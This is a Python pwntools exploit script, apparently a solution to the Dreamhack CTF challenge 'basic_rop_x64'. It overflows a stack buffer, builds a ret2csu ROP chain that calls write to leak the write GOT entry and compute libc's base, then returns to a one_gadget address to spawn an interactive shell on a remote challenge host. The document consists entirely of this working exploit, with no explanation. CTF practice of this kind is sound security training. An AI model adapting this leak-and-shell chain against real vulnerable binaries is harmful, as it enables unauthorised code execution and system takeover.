from pwn import * 

local = 0

if local == 1 :
	p = process("./basic_rop_x64")
	one_gadget = [0x4f365,0x4f3c2,0x10a45c]
	write_offset = 0x110250
else :  
	p = remote("host1.dreamhack.games",8444)
	one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
	write_offset = 0xf72b0


write_plt = 0x4005d0
write_got = 0x601020
csu_1 = 0x40087a
csu_2 = 0x400860
main = 0x4007ba


#rbx -> rbp -> addr -> rdx -> rsi -> rdi

payload1 =""
payload1 += "a"*0x40
payload1 += "b"*0x8

#write(1,write_got,8)
payload1 += p64(csu_1)
payload1 += p64(0)
payload1 += p64(1)
payload1 += p64(write_got)
payload1 += p64(8)
payload1 += p64(write_got)
payload1 += p64(1)

payload1 += p64(csu_2)
payload1 += p64(0)*7
payload1 += p64(main)

pause()
p.sendline(payload1)
p.recv(0x40)
recv = u64(p.recv(8))
libc_base = recv-write_offset

one = libc_base+one_gadget[0]

log.info(hex(libc_base))

payload2 =""
payload2 += "a"*0x40+"b"*8
payload2 += p64(one)

p.sendline(payload2)

p.interactive()